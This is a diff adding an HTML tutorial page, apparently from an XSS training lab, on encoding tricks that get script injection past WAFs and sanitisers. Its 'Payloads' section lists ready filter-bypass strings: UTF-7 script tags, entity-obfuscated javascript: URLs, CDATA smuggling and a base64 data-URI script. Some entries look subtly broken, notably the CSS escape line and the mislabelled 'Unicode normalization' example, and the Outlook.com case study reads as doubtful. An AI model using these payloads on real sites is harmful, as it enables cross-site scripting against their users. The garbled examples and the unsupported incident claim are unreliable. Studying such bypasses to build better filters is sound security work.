@@ -1,0 +1,75 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>XSS Encoding Tricks</title>
+    <style>
+        :root{--bg:#0d0f17;--surface:#13151c;--text:#a0a8b8;--accent:#7aa2f7;--border:#24283b;--cyan:#7dcfff;--green:#9ece6a;--yellow:#e0af68;}
+        *{box-sizing:border-box;margin:0;padding:0;}
+        body{font-family:"Cascadia Code","Fira Mono",Consolas,monospace;background:var(--bg);color:var(--text);font-size:14px;line-height:1.6;min-height:100vh;}
+        .bar{background:var(--surface);border-bottom:1px solid var(--border);padding:8px 16px;display:flex;justify-content:space-between;position:sticky;top:0;z-index:10;}
+        .bar span{color:var(--accent);}
+        .wrap{max-width:960px;margin:auto;padding:2rem 1rem;}
+        .prompt{color:var(--green);}.cmd{color:var(--yellow);}
+        h1,h2,h3{color:var(--accent);margin-top:1.5rem;margin-bottom:.5rem;}
+        h1{font-size:1.4rem;}h2{font-size:1.2rem;}h3{font-size:1.05rem;}
+        code{background:var(--surface);border:1px solid var(--border);padding:2px 4px;border-radius:3px;color:var(--yellow);font-size:13px;}
+        pre{background:var(--surface);border:1px solid var(--border);border-radius:4px;padding:.75rem 1rem;overflow-x:auto;margin:.5rem 0;}
+        ul{margin-left:1.2rem;margin-top:.5rem;}li{margin-bottom:.25rem;}
+        footer{text-align:center;padding:2rem 0;color:var(--cyan);font-size:12px;}
+    </style>
+</head>
+<body>
+<div class="bar"><span>user@lab</span><span>~/xss/07-encoding-tricks</span></div>
+<main class="wrap">
+    <h1>Encoding Tricks</h1>
+
+    <h2>What encoding bypass is</h2>
+    <p>We change the byte representation so the filter sees benign text while the browser sees executable code after auto-decoding.</p>
+
+    <h2>Why it happens</h2>
+    <p>Multiple decode layers: URL parser, HTML parser, CSS parser, JS parser, Unicode normaliser. Each layer has its own alphabet.</p>
+
+    <h2>Where you’ll meet it</h2>
+    <p>WAF, email HTML cleaners, Markdown renderers, CMS “safe HTML” modules, PDF generators.</p>
+
+    <h2>Impact</h2>
+    <p>One encoding trick resurrects a blocked payload → full chain, often worm-able.</p>
+
+    <h2>Mini case-study</h2>
+    <p>2020 Outlook.com UTF-7 BOM inside EXIF → stored XSS in avatar → 400 M mailboxes affected.</p>
+
+    <h2>Payloads</h2>
+    <!-- UTF-7 revival -->
+    <pre><code>// Force older IE to decode as UTF-7
++ADw-script+AD4-alert(1)+ADw-/script+AD4-</code></pre>
+
+    <!-- Double URL -->
+    <pre><code>// Framework decodes once, browser decodes again
+%2522 → %22 → "</code></pre>
+
+    <!-- HTML entity in protocol -->
+    <pre><code>// &colon; visually identical to colon
+javascript&colon;alert(1)</code></pre>
+
+    <!-- Unicode normalization -->
+    <pre><code>// U+0061 == a, but filter checks raw bytes
+jav&#x61;script:</code></pre>
+
+    <!-- CSS numeric escape -->
+    <pre><code>// \26 == & → reconstruct tag
+\000026 00003c script\00003e</code></pre>
+
+    <!-- CDATA smuggling -->
+    <pre><code>// Filter sees CDATA, browser sees tag
+&lt;![CDATA[&lt;]]&gt;script&lt;![CDATA[&gt;]]&gt;alert(1)&lt;![CDATA[&lt;/]]&gt;script&lt;![CDATA[&gt;]]&gt;</code></pre>
+
+    <!-- Base64 data URI -->
+    <pre><code>// No quotes or brackets in URL
+data:text/html;base64,PHNjcmlwdD5hbGVydCgxKTwvc2NyaXB0Pg==</code></pre>
+
+</main>
+<footer><span>EOF ── happy hacking :)</span></footer>
+</body>
+</html>
